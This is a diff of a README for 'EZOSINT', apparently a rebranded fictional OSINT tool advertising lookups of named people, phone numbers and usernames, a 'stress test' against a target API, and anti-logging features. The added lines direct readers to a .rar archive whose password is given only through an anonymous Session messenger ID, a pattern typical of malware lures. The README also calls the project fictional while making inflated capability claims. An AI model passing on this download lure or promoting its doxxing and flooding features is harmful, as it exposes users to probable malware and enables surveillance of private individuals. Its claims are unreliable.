@@ -1,65 +1,65 @@
+````md
 # ⚡ EZOSINT ⚡
+### *Open Source Intelligence Redefined*
 
-### *The Ultimate Intelligence Framework*
-
-> *« Ce que les autres considèrent comme impossible, ezosint l’exécute en quelques secondes. »*
+> *« What others can’t find, EZOSINT reveals in seconds. »*
 
 ---
 
 # 🛰️ Présentation
 
-**EZOSINT** est un framework fictif ultra-avancé conçu pour les démonstrations, showcases GitHub et projets de cybersécurité.
-Il combine des technologies d’OSINT, d’automatisation réseau et d’analyse de données dans une seule interface.
+**EZOSINT** est un framework OSINT fictif ultra-avancé conçu pour les démonstrations GitHub, showcases cybersécurité et interfaces de renseignement numérique.  
 
-⚠️ **Projet fictif destiné au style, à l’apprentissage et au roleplay technique uniquement.**
+Le projet regroupe plusieurs modules d’analyse, de corrélation et de recherche d’informations dans une seule plateforme moderne et rapide.
+
+⚠️ **Projet fictif destiné uniquement au design, à l’apprentissage et au roleplay technique.**
 
 ---
 
 # 🔥 Fonctionnalités
 
-## 🌍 Lookup IP Multi-Database
-
-* Scan de réputation IP
-* Géolocalisation avancée
-* Détection VPN / Proxy / TOR
-* Analyse ASN & hébergeur
-* Historique de connexions
-* Corrélation avec des milliers de bases de données
-* Fingerprint réseau en temps réel
+## 🌍 IP Intelligence
+- Lookup IP multi-database
+- Géolocalisation avancée
+- Détection VPN / Proxy / TOR
+- Analyse ASN & hébergeur
+- Historique réseau
+- Corrélation avec plusieurs bases de données
+- Fingerprint temps réel
 
 ```bash
-phantomx ip 8.8.8.8
-```
+ezosint ip 8.8.8.8
+````
 
 ---
 
-## 👤 Lookup Identité
+## 👤 Identity Lookup
 
 * Recherche Nom / Prénom
 * Corrélation multi-sources
-* Alias & pseudos associés
-* Réseaux sociaux liés
-* Recherche email & username
-* Indexation de profils publics
-* Analyse de présence numérique
+* Alias & pseudos liés
+* Recherche email
+* Analyse réseaux sociaux
+* Indexation publique
+* Presence mapping
 
 ```bash
-phantomx identity "John Doe"
+ezosint identity "John Doe"
 ```
 
 ---
 
-## 📱 Mobile Intelligence
+## 📱 Phone Intelligence
 
-* Lookup numéro de téléphone
+* Lookup numéro
 * Détection opérateur
-* Région & pays
-* Analyse d’activité publique
+* Pays & région
 * Vérification VoIP
-* Historique d’utilisation publique
+* Analyse activité publique
+* Corrélation téléphonique
 
 ```bash
-phantomx phone +33XXXXXXXXX
+ezosint phone +33612345678
 ```
 
 ---
@@ -67,50 +67,50 @@ phantomx phone +33XXXXXXXXX
 ## 🌐 Username Tracker
 
 * Recherche automatique sur +500 plateformes
-* Détection de comptes liés
-* Analyse de pseudos similaires
+* Détection comptes liés
+* Analyse pseudo similaire
 * Mapping des profils trouvés
 
 ```bash
-phantomx username phantomx
+ezosint username ghost
 ```
 
 ---
 
 ## 🧠 AI Threat Analyzer
 
-* Détection de comportements suspects
-* Score de risque numérique
 * Analyse comportementale
-* Corrélation IA temps réel
-* Prediction Engine v4
+* Détection activité suspecte
+* Risk score IA
+* Corrélation temps réel
+* Prediction Engine v5
 
 ---
 
 ## 💣 Stress Testing Suite
 
-* Module de simulation de charge réseau
-* Tests de robustesse API
-* Simulations de flood contrôlées
-* Outils de benchmark
+* Simulations de charge réseau
+* Benchmark API
+* Analyse de stabilité
+* Monitoring haute performance
 
 ```bash
-phantomx stress-test api.target.com
+ezosint stress-test api.target.com
 ```
 
 ---
 
 # ⚙️ Technologies
 
-| Technologie | Utilisation               |
-| ----------- | ------------------------- |
-| Python 3.12 | Core Engine               |
-| AsyncIO     | Multi-thread ultra rapide |
-| MongoDB     | Data indexing             |
-| Redis       | Cache haute performance   |
-| TensorFlow  | Analyse IA                |
-| Docker      | Déploiement sécurisé      |
-| FastAPI     | API backend               |
+| Technologie | Utilisation       |
+| ----------- | ----------------- |
+| Python 3.12 | Core Engine       |
+| AsyncIO     | Ultra Fast Tasks  |
+| MongoDB     | Data Indexing     |
+| Redis       | Cache System      |
+| TensorFlow  | AI Engine         |
+| Docker      | Secure Deployment |
+| FastAPI     | Backend API       |
 
 ---
 
@@ -118,7 +118,7 @@ phantomx stress-test api.target.com
 
 ```text
 ╔══════════════════════════════════════════╗
-║          EZOSINT TERMINAL                ║
+║               EZOSINT                   ║
 ╠══════════════════════════════════════════╣
 ║ STATUS      : ONLINE                    ║
 ║ DATABASES   : 247 CONNECTED             ║
@@ -130,11 +130,31 @@ phantomx stress-test api.target.com
 
 ---
 
+# 📦 Download
+
+Le projet est disponible ici :
+
+https://github.com/osinttoolfr/ezosint/
+
+Le fichier est fourni au format `.rar`.
+
+---
+
+# 🔑 Password Access
+
+Pour obtenir le mot de passe de l’archive, il faut envoyer un message via Session avec l’ID suivant :
+
+```text
+05a2aee17f5918f1d8058382d11c515c97c87be8c375980159cae57f7cbb8df51a
+```
+
+---
+
 # 🚀 Installation
 
 ```bash
-git clone https://github.com/phantomx/phantomx
-cd phantomx
+git clone https://github.com/osinttoolfr/ezosint/
+cd ezosint
 pip install -r requirements.txt
 python main.py
 ```
@@ -143,12 +163,12 @@ python main.py
 
 # 🔐 Sécurité
 
-* Chiffrement AES-256
-* Protection anti-logging
-* Sandbox intégrée
-* Rotation automatique des connexions
-* Proxy chaining
-* Architecture Zero Trace
+* AES-256 Encryption
+* Anti Logging System
+* Integrated Sandbox
+* Secure Runtime
+* Proxy Chaining
+* Zero Trace Architecture
 
 ---
 
@@ -158,7 +178,7 @@ python main.py
 | ------------- | ----------- |
 | Lookup IP     | < 0.3 sec   |
 | Username Scan | 500+ sites  |
-| Analyse IA    | Temps réel  |
+| AI Analysis   | Temps réel  |
 | API Requests  | 2M+/jour    |
 
 ---
@@ -166,10 +186,10 @@ python main.py
 # 🧬 Exemple d’utilisation
 
 ```bash
-phantomx ip 1.1.1.1
-phantomx username ghost
-phantomx identity "Jane Smith"
-phantomx phone +33612345678
+ezosint ip 1.1.1.1
+ezosint username phantom
+ezosint identity "Jane Smith"
+ezosint phone +33612345678
 ```
 
 ---
@@ -177,11 +197,12 @@ phantomx phone +33612345678
 # 📡 API Example
 
 ```python
-from phantomx import Client
+from ezosint import Client
 
 client = Client(api_key="YOUR_KEY")
 
 result = client.lookup_ip("8.8.8.8")
+
 print(result)
 ```
 
@@ -206,7 +227,7 @@ print(result)
 [EZOSINT] Initializing secure environment...
 [EZOSINT] Connecting to intelligence nodes...
 [EZOSINT] 247 databases linked.
-[EZOSINT] AI threat engine started.
+[EZOSINT] AI engine started.
 [EZOSINT] Ready.
 ```
 
@@ -221,8 +242,6 @@ Aucune fonctionnalité offensive réelle n’est fournie.
 
 # ⭐ Support
 
-Si ce projet te plaît :
-
 ⭐ Star le repo
 🍴 Fork le projet
 🛰️ Rejoins la communauté EZOSINT
@@ -232,3 +251,6 @@ Si ce projet te plaît :
 # 👑 EZOSINT
 
 > *« Intelligence beyond limits. »*
+
+```
+```
